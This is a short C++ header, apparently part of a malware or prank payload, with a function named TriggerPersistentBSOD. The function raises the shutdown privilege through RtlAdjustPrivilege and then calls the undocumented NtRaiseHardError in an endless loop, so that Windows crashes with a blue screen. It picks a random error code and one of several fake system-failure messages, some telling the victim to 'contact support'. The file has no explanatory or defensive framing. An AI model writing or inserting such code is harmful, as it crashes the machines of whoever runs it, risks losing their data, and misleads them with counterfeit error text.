#pragma once
#include <windows.h>
#include <math.h>
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

BOOLEAN bl;
DWORD response;

void TriggerPersistentBSOD() {
	// Randomized messages for the BSOD
	const char* messages[] = {
		"Your computer has encountered a critical error.",
		"A fatal system error has occurred.",
		"System failure: Critical corruption detected.",
		"System halted: Please contact support.",
		"An unknown error caused your system to crash."
	};

	// Seed the random number generator
	srand(static_cast<unsigned int>(time(0)));
	int randomMessageIndex = rand() % (sizeof(messages) / sizeof(messages[0]));

	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");

	// Adjust privileges to allow the BSOD
	RtlAdjustPrivilege(19, 1, 0, &bl);

	// Generate a random error code for the BSOD
	DWORD randomErrorCode = 0xC0000999 | (rand() % 0xFFFFFF);

	// Set up the error arguments (using the random message)
	ULONG_PTR args[] = { (ULONG_PTR)messages[randomMessageIndex] };

	// Trigger the BSOD with the random error code and keep the screen locked
	while (true) {
		NtRaiseHardError(randomErrorCode, 1, 0, (PULONG)args, 6, &response);
		Sleep(1000); // Add a small delay to avoid overwhelming the system
	}
}
